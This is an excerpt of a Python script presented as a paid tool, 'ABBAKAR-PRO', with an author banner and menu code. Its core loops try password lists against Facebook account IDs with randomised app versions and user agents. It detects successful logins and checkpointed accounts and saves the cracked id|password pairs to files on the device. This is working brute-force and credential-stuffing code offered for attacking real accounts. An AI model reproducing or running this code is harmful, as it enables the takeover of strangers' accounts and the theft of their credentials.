...
\033[0;97m            
      ----------------------------------------------------------------------------------------------------------------------------------------
 Author    :  ABBAKAREO 
 Github     : ABBAKARHACKER 
 Facebook  : ABDULLAHI ABuBAKAR
Tool Name : ABBAKAR-PRO
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 ABBAKAR Pro version 1.9.8
 For Haters: barka da zuwa Abokai 
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi ABBAKAR , I Need To Buy Your Paid ABBAKAR PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [ABBAKAR-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ABBAKAR-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in abbakar:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ABBAKAR-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ABBAKAR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ABBAKAR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ABBAKAR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ABBAKAR-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ABBAKAR-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ABBAKAR-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/ABBAKAR-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ABBAKAR-OK] '+uid+' | '+pas+'\033[1;97m')
